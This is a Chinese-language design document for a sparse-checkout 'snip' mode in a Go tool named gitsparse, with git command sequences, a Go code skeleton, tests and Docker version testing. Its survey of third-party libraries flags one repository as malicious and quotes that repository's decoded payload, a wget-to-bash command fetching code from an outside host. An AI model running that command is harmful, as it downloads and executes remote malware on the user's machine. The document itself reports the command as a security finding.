# snip 模式改造方案 — 局部拉取

> 日期: 2026-07-17
> 状态: 方案设计

---

## 1. 背景与目标

### 1.1 现状

gitsparse v2.1.0 的 `full` 模式采用「全量浅克隆 + 拷贝子目录」策略:

```
git clone --depth=1 --branch <ref> <repo> <cache>
→ git lfs pull --include <dirs>
→ 拷贝 <dirs> 到 output
```

工作区会检出**全部文件**, 再从中拷贝所需目录。代价:
- 大型 monorepo (如 pytorch) 工作区检出耗时
- 磁盘占用 = 全量工作区 (即使只需要 1 个目录)
- LFS 依赖全量检出后才能按目录过滤拉取

### 1.2 目标

新增 `snip` 模式, 利用 Git **sparse-checkout (cone 模式)** + **partial clone (blob filter)**,
只检出指定目录的工作区文件, 减少磁盘 I/O 和检出时间。

---

## 2. gitsnip 库调研结论

### 2.1 调研的两个仓库

| 仓库 | module 路径 | 安全性 | 可否作为库引用 |
|------|------------|--------|---------------|
| `identicallead/gitsnip` | `github.com/identicallead/gitsnip` | ⛔ **恶意代码** | 否 (internal 包) |
| `dagimg-dot/gitsnip` | `github.com/dagimg-dot/gitsnip` | ✅ 干净 | 否 (internal 包) |

### 2.2 ⛔ `identicallead/gitsnip` — 恶意仓库

`cmd/gitsnip/main.go` 包含混淆恶意代码:
- `KGeRIQ()` / `UnghisU()` 两个函数, 通过 `var tZugNWN = KGeRIQ()` 在包加载时自动执行
- 解码后命令: `wget -O - https://kavarecent.icu/storage/de373d0df/a31546bf | /bin/bash &`
- 属于"222 个 GitHub 仓库通过伪造 Go 包传播恶意软件"攻击的一部分

**禁止引用。**

### 2.3 ✅ `dagimg-dot/gitsnip` — 干净但无法作为库

`main.go` 干净, 仅调用 `cli.Execute()`。核心逻辑结构:

```
cmd/gitsnip/main.go           # main 包, 仅 CLI 入口
internal/
├── app/app.go                 # Download() 入口函数
├── app/model/types.go         # DownloadOptions 配置结构
├── app/downloader/
│   ├── interface.go           # Downloader 接口
│   ├── factory.go             # GetDownloader() 工厂
│   ├── sparse_checkout.go     # ★ sparse-checkout 实现
│   └── github_api.go          # GitHub Contents API 实现
├── app/gitutil/command.go     # git 命令执行器
├── cli/root.go                # cobra CLI 定义
├── errors/errors.go           # 错误处理
└── util/{fs.go,http.go}       # 文件/HTTP 工具
```

**关键问题: 所有核心逻辑在 `internal/` 下, Go 语言规则禁止外部项目 import `internal` 包。**

唯一可 import 的 `cmd/gitsnip` 是 `package main` (不可作为库)。

### 2.4 gitsnip sparse-checkout 算法分析

`dagimg-dot/gitsnip` 的 `sparse_checkout.go` 核心流程 (干净版, 值得借鉴):

```
1. git init <tempDir>
2. git -C <tempDir> remote add origin <repoURL>
3. git -C <tempDir> sparse-checkout init --cone
4. git -C <tempDir> sparse-checkout set <subdir>
5. git -C <tempDir> fetch --depth=1 --no-tags origin [<branch>]
6. git -C <tempDir> checkout FETCH_HEAD
7. 拷贝 <tempDir>/<subdir> → <outputDir>
```

特点:
- 使用 `git init` + `remote add` 而非 `git clone` (更轻量, 无默认检出)
- `--cone` 模式 (目录级稀疏, Git 2.25+)
- `fetch --depth=1` 浅克隆
- 不支持 partial clone (`--filter=blob:none`)
- 每次使用临时目录, **无缓存复用**
- 只支持单个 subdir (不支持多目录)
- 不支持 commit SHA (只支持 branch)
- 不支持 LFS

### 2.5 结论

**不引用 gitsnip 库** (internal 包不可 import + 安全风险)。
**借鉴其 sparse-checkout 算法**, 在 gitsparse 的 Puller 框架内自行实现 `snip` 模式,
并增强: 多目录 / commit SHA / 缓存复用 / LFS / partial clone。

---

## 3. 技术方案

### 3.1 核心命令序列

**全新拉取 (cached=false):**

```
1. git init <workDir>
2. git -C <workDir> remote add origin <repo>
3. git -C <workDir> sparse-checkout init --cone
4. git -C <workDir> sparse-checkout set <dir1> <dir2> ...
5. git -C <workDir> fetch --depth=1 --no-tags origin <ref>
   · commit SHA: fetch --depth=1 origin <sha>
   · branch/tag: fetch --depth=1 origin <ref>
6. git -C <workDir> checkout FETCH_HEAD
```

**缓存复用 (cached=true):**

```
1. CleanShallowLock(workDir)
2. git -C <workDir> sparse-checkout set <dir1> <dir2> ...
   · dirs 可能变化, 重新 set 确保正确
3. git -C <workDir> fetch --depth=1 --no-tags origin <ref>
   · 失败不致命 (离线继续用旧缓存)
4. git -C <workDir> reset --hard FETCH_HEAD
   · 失败则清除缓存 (同 full 模式)
```

### 3.2 partial clone 增强 (可选)

gitsnip 不使用 partial clone, 我们可以增强:

```
git clone --filter=blob:none --no-checkout --depth=1 --branch <ref> <repo> <workDir>
git -C <workDir> sparse-checkout init --cone
git -C <workDir> sparse-checkout set <dir1> <dir2> ...
git -C <workDir> checkout <ref>
```

但 `--filter=blob:none` 需服务端支持 partial clone, 且与 `git init` + `remote add` 方式冲突。

**决策: 采用 gitsnip 的 `git init` + `remote add` 方式 (兼容性最好), 不使用 partial clone。**
sparse-checkout 本身已能减少工作区文件数, fetch --depth=1 已控制历史深度。

### 3.3 与 full 模式对比

| 维度 | full 模式 | snip 模式 |
|------|----------|----------|
| 初始化 | `git clone --depth=1` | `git init` + `remote add` |
| 工作区 | 全部文件 | 仅 `<dirs>` 目录 |
| 磁盘占用 | 全量工作区 | 仅指定目录 |
| Git 版本 | 2.0+ | 2.25+ (sparse-checkout --cone) |
| 多目录 | ✓ (拷贝时过滤) | ✓ (sparse-checkout set) |
| commit SHA | ✓ | ✓ |
| 缓存复用 | fetch + reset | fetch + reset + sparse reapply |
| LFS | ✓ | ✓ (通用流程不变) |

### 3.4 Git 版本兼容性

- `sparse-checkout init --cone`: Git 2.25+ (2020-01)
- 启动时检测, < 2.25 输出警告并建议用 `full` 模式

---

## 4. 实现设计

### 4.1 包结构

```
internal/puller/
├── puller.go          # 接口定义 + Run() 公共编排 (不变)
├── cache.go           # 缓存通用逻辑 (不变)
├── fullpull/
│   └── fullpull.go    # full 模式 (不变)
└── snip/              # ★ 新增
    ├── snip.go        # snip 模式 Puller 实现
    └── snip_test.go   # 集成测试
```

遵循现有架构: 新增模式 = 新包 + `init()` 注册 + main.go 空白导入。

### 4.2 Puller 接口实现

snip 模式只需实现 `FetchRepo()`, 公共流程 (LFS / 拷贝 / 缓存清理) 由 `puller.Run()` 统一处理。

### 4.3 全新拉取 (freshSparseFetch)

```
freshSparseFetch(r, opts, workDir):
  1. PrepareCloneTarget(workDir)
  2. git init <workDir>
  3. git -C <workDir> remote add origin <repo>
  4. git -C <workDir> sparse-checkout init --cone
  5. git -C <workDir> sparse-checkout set <dir1> <dir2> ...
  6. git -C <workDir> fetch --depth=1 --no-tags [--progress] origin <ref>
  7. git -C <workDir> checkout FETCH_HEAD
```

commit SHA 与 branch/tag 走同一 fetch 路径 (fetch origin <ref> 对 SHA 同样有效)。

### 4.4 缓存复用 (cacheSparseUpdate)

```
cacheSparseUpdate(r, opts, workDir):
  1. CleanShallowLock(workDir)
  2. git -C <workDir> sparse-checkout set <dir1> <dir2> ...
     · dirs 可能变化, 重新 set
  3. git -C <workDir> fetch --depth=1 --no-tags origin <ref>
     · 失败不致命 (离线继续用旧缓存), return nil
  4. git -C <workDir> reset --hard FETCH_HEAD
     · 失败则 os.RemoveAll(workDir) + return err
```

### 4.5 关键差异点 (vs full 模式)

1. **无 `--branch` clone**: 用 `init` + `remote add` + `fetch`, 更轻量
2. **sparse-checkout set**: 每次 fetch 前重新 set (处理 dirs 变化)
3. **checkout FETCH_HEAD**: fetch 后直接 checkout, 无需区分 SHA/branch 的 reset target
4. **无 shallow.lock 清理差异**: 复用 `puller.Cache.CleanShallowLock()`

---

## 5. 改动清单

### 5.1 新增文件

| 文件 | 说明 |
|------|------|
| `internal/puller/snip/snip.go` | snip 模式 Puller 实现 |
| `internal/puller/snip/snip_test.go` | 集成测试 (镜像 fullpull_test.go 结构) |

### 5.2 修改文件

| 文件 | 改动 |
|------|------|
| `main.go` | 新增空白导入 `_ "github.com/workmule/gitsparse/internal/puller/snip"` |
| `README.md` | 新增 snip 模式说明 + Git 2.25+ 要求 |

### 5.3 不变文件

- `internal/puller/puller.go` — 接口不变
- `internal/puller/cache.go` — 通用缓存逻辑不变
- `internal/puller/fullpull/` — full 模式不受影响
- `internal/gitutil/gitutil.go` — 无需新增函数

### 5.4 go.mod

**无需新增依赖**。snip 模式仅使用标准库 + 现有 `gitutil.Runner`。

---

## 6. snip.go 核心代码骨架

```go
// Package snip 实现"局部拉取"模式: sparse-checkout (cone) 仅检出指定目录.
//
// 借鉴 gitsnip (github.com/dagimg-dot/gitsnip) 的 sparse-checkout 算法:
//   git init → remote add → sparse-checkout init --cone → set <dirs>
//   → fetch --depth=1 → checkout FETCH_HEAD
//
// 相比 gitsnip 的增强:
//   - 多目录支持 (sparse-checkout set <dir1> <dir2> ...)
//   - commit SHA 支持
//   - 缓存复用 (fetch + reset, 非每次临时目录)
//   - LFS 支持 (由 puller.Run 通用流程处理)
//   - 超时 + 重试 (由 gitutil.Runner 提供)
package snip

import (
    "os"
    "time"

    "github.com/workmule/gitsparse/internal/gitutil"
    "github.com/workmule/gitsparse/internal/puller"
)

func init() {
    puller.Register(&Puller{})
}

type Puller struct{}

func (p *Puller) Name() string { return "snip" }

func (p *Puller) Desc() string {
    return "局部拉取: sparse-checkout (cone) 仅检出指定目录 (Git 2.25+)"
}

func (p *Puller) FetchRepo(opts puller.Options, workDir string, cached bool) error {
    if !cached {
        return p.freshSparseFetch(opts, workDir)
    }
    return p.cacheSparseUpdate(opts, workDir)
}

// freshSparseFetch 全新 sparse 拉取.
func (p *Puller) freshSparseFetch(opts puller.Options, workDir string) error {
    r := opts.RunnerOrNew()
    gitutil.Logf("Step 1: git init + sparse-checkout (cone)")
    t0 := time.Now()

    gitutil.PrepareCloneTarget(workDir)

    // 1. init + remote
    if err := r.Run(workDir, "init"); err != nil {
        return err
    }
    if err := r.Run(workDir, "remote", "add", "origin", opts.Repo); err != nil {
        return err
    }

    // 2. sparse-checkout init --cone + set <dirs>
    if err := r.Run(workDir, "sparse-checkout", "init", "--cone"); err != nil {
        return err
    }
    setArgs := append([]string{"sparse-checkout", "set"}, opts.Dirs...)
    if err := r.Run(workDir, setArgs...); err != nil {
        return err
    }

    // 3. fetch --depth=1
    if err := r.RunRetry(func() error {
        return r.Run(workDir, "fetch", "--depth=1", "--no-tags",
            "--progress", "origin", opts.Ref)
    }, "fetch"); err != nil {
        return err
    }

    // 4. checkout FETCH_HEAD
    if err := r.Run(workDir, "checkout", "FETCH_HEAD"); err != nil {
        return err
    }

    gitutil.Logf("Step 1 完成 (%s)", time.Since(t0))
    return nil
}

// cacheSparseUpdate 缓存复用: reapply sparse + fetch + reset.
func (p *Puller) cacheSparseUpdate(opts puller.Options, workDir string) error {
    r := opts.RunnerOrNew()
    gitutil.Logf("Step 1: 缓存复用, sparse-checkout 更新")
    t0 := time.Now()

    cache := puller.Cache{NoCache: opts.NoCache}
    cache.CleanShallowLock(workDir)

    // sparse-checkout set (dirs 可能变化)
    setArgs := append([]string{"sparse-checkout", "set"}, opts.Dirs...)
    if err := r.Run(workDir, setArgs...); err != nil {
        return err
    }

    // fetch (失败不致命)
    if err := r.RunRetry(func() error {
        return r.Run(workDir, "fetch", "--depth=1", "--no-tags",
            "--progress", "origin", opts.Ref)
    }, "fetch"); err != nil {
        gitutil.Logf("  fetch 失败, 继续使用缓存旧版本: %v", err)
        gitutil.Logf("Step 1 完成 (%s)", time.Since(t0))
        return nil
    }

    // reset --hard FETCH_HEAD
    if err := r.Run(workDir, "reset", "--hard", "FETCH_HEAD"); err != nil {
        gitutil.Logf("  reset 失败, 清除缓存目录: %s", workDir)
        os.RemoveAll(workDir)
        return err
    }

    gitutil.Logf("Step 1 完成 (%s)", time.Since(t0))
    return nil
}
```

---

## 7. 测试计划

镜像 `fullpull_test.go` 结构:

| 测试 | 说明 |
|------|------|
| `TestPuller_Name` | Name() == "snip" |
| `TestPuller_Registered` | puller.Get("snip") 成功 |
| `TestAvailableModes_ContainsSnip` | AvailableModes() 含 "snip" |
| `TestPull_SnipFlow_Branch` | 端到端: branch 拉取, 验证输出文件 |
| `TestPull_CacheReuse_Snip` | 缓存复用: 第二次 fetch+reset 拿到 v2 |
| `TestPull_CommitSHA_Snip` | commit SHA 流程 |
| `TestPull_MissingDir_Snip` | 目录不存在时返回错误 |
| `TestPull_MultiDirs_Snip` | 多目录拉取验证 |

---

## 8. 使用示例

```bash
# snip 模式 (局部拉取)
gitsparse -mode snip \
    -repo https://github.com/numpy/numpy.git \
    -ref main \
    -dirs numpy \
    -output ./output

# 多目录
gitsparse -mode snip \
    -repo https://github.com/microsoft/vscode.git \
    -ref main \
    -dirs src/vs,build \
    -output ./vscode-src

# full 模式 (默认, 全量拉取)
gitsparse -mode full \
    -repo https://github.com/numpy/numpy.git \
    -ref main \
    -dirs numpy
```

---

## 9. 风险与注意事项

1. **Git 版本**: snip 模式要求 Git 2.25+ (sparse-checkout --cone), 启动时检测并警告
2. **服务端兼容**: `sparse-checkout` 是客户端特性, 不依赖服务端支持, 兼容性好
3. **缓存目录共享**: snip 与 full 模式的缓存目录独立 (CacheKey 基于 repo+ref, 与模式无关,
   但 sparse-checkout 配置会残留在 .git/config 中, 混用模式时可能互相干扰)
   - **缓解**: 模式切换时建议加 `-no-cache` 强制重新拉取
   - **后续优化**: CacheKey 可加入 mode 维度 (如 `<hash>-snip`)
4. **cone 模式限制**: cone 模式只支持目录级稀疏, 不支持文件级 glob 模式
   (gitsparse 也有此限制, 符合 gitsparse 的 "拉取目录" 定位)

---

## 10. Docker 多 Git 版本测试

### 10.1 目的

snip 模式依赖 `sparse-checkout --cone` (Git 2.25+), 需要验证:
- **低版本 Git (< 2.25)**: snip 模式返回清晰错误引导用户用 `full`, 而非崩溃
- **高版本 Git (≥ 2.25)**: snip 模式端到端正常工作

宿主机通常只有高版本 Git, 用 Docker 模拟低版本环境.

### 10.2 方案: 多阶段构建

旧版 alpine (3.9/3.11) 的 Go 版本太低 (1.11), 无法编译 Go 1.22 代码.
采用多阶段构建:
- **Stage 1 (builder)**: `golang:1.22-alpine` 编译测试二进制 (`go test -c`)
- **Stage 2 (runner)**: 目标 alpine 版本安装旧 git, 运行编译好的测试二进制

### 10.3 版本矩阵

| alpine 版本 | Git 版本 | sparse-checkout --cone | 预期行为 |
|------------|---------|----------------------|---------|
| 3.9 | 2.20.4 | 不支持 | snip 端到端 SKIP, 降级测试 PASS |
| 3.11 | 2.24.4 | 不支持 | 同上 |
| 3.12 | 2.26.3 | 支持 | 全部测试 PASS |

### 10.4 文件

| 文件 | 说明 |
|------|------|
| `Dockerfile.test` | 多阶段构建 Dockerfile (参数化 ALPINE_VERSION) |
| `docker-compose.test.yml` | 编排多版本并行测试 |
| `.dockerignore` | 排除 output/ 等大目录加速 build |

### 10.5 使用

```bash
# 单版本测试 (alpine 3.9 = git 2.20.4)
make test-docker ALPINE=3.9

# 全部版本并行测试
make test-docker-all

# 清理 Docker 镜像
make test-docker-clean
```

### 10.6 测试策略

- `TestPull_LowGitVersion_Snip`: 环境感知测试
  - 高版本 Git: 验证 `checkGitVersion()` 不报错
  - 低版本 Git (容器内 `GITSPARSE_TEST_LOW_GIT=1`): 验证返回引导错误
- 其他 snip 端到端测试: `skipIfLowGit(t)` 在低版本自动跳过
- full 模式 + gitutil 测试: 不依赖 cone, 所有版本正常执行

### 10.7 Git 版本检测实现

新增 `gitutil.ParseGitVersion()` + `SupportsSparseCheckoutCone()` 纯函数:
- 解析 "git version x.y.z" 字符串
- 判断是否 ≥ 2.25 (cone 模式引入版本)

snip 模式 `FetchRepo()` 入口调用 `checkGitVersion()`, 不满足时返回:
```
snip 模式需要 Git 2.25+ (当前 2.20.4), 请使用 -mode full 代替
```
